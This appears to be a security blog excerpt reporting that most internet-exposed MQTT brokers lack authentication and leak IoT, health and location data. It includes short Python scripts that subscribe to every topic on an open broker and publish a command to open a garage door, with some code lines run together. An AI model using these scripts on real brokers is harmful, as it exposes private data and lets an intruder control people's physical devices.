We can see that **most MQTT Servers don't even use authentication (almost 70%).** Only 11% of all hosts returned us a "Bad user name or password" code in the CONNACK packet (I wonder if they use default passwords !?).

A summary of some of the open MQTT servers found in the wild:

- Different kinds of IoT devices
- Sensors: Light and temperature values
- Fitness devices: Fitbit
- Health devices: Blood Pressure Monitors
- Location services: Owntracks (really creepy stuff!)
- Home automation kits: SmartThings (Samsung)

## Code

```bash
# deps ### Test if that's right pypi

pip3 install paho.mqtt.client
```

You can connect to a server and subscribe to all topics with a simple script:

```python
import paho.mqtt.client as mqttdef on_connect(client, userdata, flags, rc):
   print "[+] Connection successful"
   client.subscribe('#', qos = 1)        # Subscribe to all topics
   client.subscribe('$SYS/#')            # Broker Status (Mosquitto)def on_message(client, userdata, msg):
   print '[+] Topic: %s - Message: %s' % (msg.topic, msg.payload)client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.on_message = on_message
client.connect('SERVER IP HERE', 1883, 60)
client.loop_forever()
```

A Frightening security risk appears when an attacker is able to control IoT devices by publishing commands to a MQTT topic (e.g., turn off the lights and open the garage door). A simple python script to open a fictitious garage door is shown here:

```python
import paho.mqtt.client as mqttdef on_connect(client, userdata, flags, rc):
   print "[+] Connection success"client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.connect('IP SERVER HERE', 1883, 60)
client.publish('smarthouse/garage/door', "{'open':'true'}")
```
